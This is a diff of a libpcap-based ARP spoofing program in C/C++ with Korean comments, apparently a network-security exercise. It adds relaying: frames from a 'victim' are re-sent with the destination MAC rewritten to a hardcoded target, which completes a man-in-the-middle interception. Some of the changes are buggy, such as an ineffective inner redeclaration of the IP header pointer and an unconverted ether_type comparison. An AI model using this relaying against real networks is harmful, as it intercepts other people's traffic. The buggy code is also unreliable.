@@ -49,6 +49,7 @@ void receive_arp(int c, const char* sender_ip);
 
 bool getMyMacAddress(const char* interface, char* mac_str);
 bool getMyIpAddress(const char* interface, char* ip_str);
+void print_packet(const u_char* packet, u_int32_t packet_len);
 
 int main(int argc, char* argv[]) {
 	if (argc < 4 || argc % 2 != 0) {
@@ -82,7 +83,6 @@ int main(int argc, char* argv[]) {
 
         /* sender에서 보낸 패킷 수신 */
         while (true) {
-            
             struct pcap_pkthdr* header;
             const u_char* packet;
             int res = pcap_next_ex(pcap, &header, &packet);
@@ -93,17 +93,45 @@ int main(int argc, char* argv[]) {
             }
             // printf("%u bytes captured\n", header->caplen);
             ETHERNET_HDR *eth = (ETHERNET_HDR *)packet;
+
+            /* 이더넷 헤더와 ip 헤더 사이에 바이트 패딩이 있을 경우 바이트 패딩 무시 후 구조체 포인터 캐스팅 */
             IPV4_HDR *ipv4 = (IPV4_HDR *)(packet + sizeof(ETHERNET_HDR));
-            char src_mac[18], dst_ip[16], src_ip[16];
+            if ((packet + sizeof(ETHERNET_HDR))[0] == 0x00)
+                IPV4_HDR *ipv4 = (IPV4_HDR *)(packet + sizeof(ETHERNET_HDR) + 1);
+            char dst_mac[18], src_mac[18], dst_ip[16], src_ip[16];
             bytemac_to_stringmac(eth->ether_shost, src_mac);
+            bytemac_to_stringmac(eth->ether_dhost, dst_mac);
             byteip_to_stringip(&(ipv4->ip_src), src_ip);
             byteip_to_stringip(&(ipv4->ip_dst), dst_ip);
-            strncpy(src_mac, sender_mac, 18);
-            if(strncmp(src_mac, sender_mac, 18) == 0) {
-                printf("Received reply from victim from %s to %s\n", src_ip, dst_ip);
+            // printf("%u bytes captured\n", header->caplen);
+            // print_ethernet(eth);
+            // print_ipv4(ipv4);
+            // printf("%s %s\n",sender_mac, my_mac);
+
+
+            if(strncmp(src_mac, sender_mac, 18) == 0 && strncmp(dst_mac, my_mac, 18) == 0) {
+                printf("-------------------\n");
+                printf("\nReceived reply from victim\n(from %s to %s)\n", src_ip, dst_ip);
+                // printf("src mac %s dst mac %s\n",src_mac, dst_mac);
+                // printf("src ip %s dst ip %s\n", src_ip, dst_ip);
+                /* 패킷을 target으로 전송 */
+                ETHERNET_HDR *infection_eth = new ETHERNET_HDR();
+                u_char* infection_packet = new u_char[header->caplen];
+
+                stringmac_to_bytemac("DE:45:B8:D1:9B:64", infection_eth->ether_dhost);
+                memcpy(infection_eth->ether_shost, eth->ether_shost, 6);
+                infection_eth->ether_type = eth->ether_type;
+                print_ethernet(infection_eth);
+
+                memcpy(infection_packet, infection_eth, sizeof(ETHERNET_HDR));
+                memcpy(infection_packet + sizeof(ETHERNET_HDR), packet + sizeof(ETHERNET_HDR), header->caplen - sizeof(ETHERNET_HDR));
+ 
+                if(pcap_sendpacket(pcap, infection_packet, header->caplen) != 0) {
+                    fprintf(stderr, "send packet error: %s\n", pcap_geterr(pcap));
+                }
+                delete infection_eth;
+                delete[] infection_packet;
             }
-
-
         }
 	}
 	pcap_close(pcap);
@@ -236,7 +264,7 @@ bool getMyMacAddress(const char* interface, char* mac_str) {
     
     close(sock);
     unsigned char* mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;
-    sprintf(mac_str, "%02x:%02x:%02x:%02x:%02x:%02x",
+    sprintf(mac_str, "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
     return true;
 }
@@ -259,4 +287,14 @@ bool getMyIpAddress(const char* interface, char* ip_str) {
 
 	strcpy(ip_str, inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr));
     return true;
+}
+
+void print_packet(const u_char* packet, u_int32_t packet_len) {
+    ETHERNET_HDR* ethernet = (ETHERNET_HDR*) packet;
+    print_ethernet(ethernet);
+    
+    if(ethernet->ether_type != 0x0800) return;
+
+    IPV4_HDR* ip = (IPV4_HDR*) (packet + sizeof(ETHERNET_HDR));
+    print_ipv4(ip);
 }
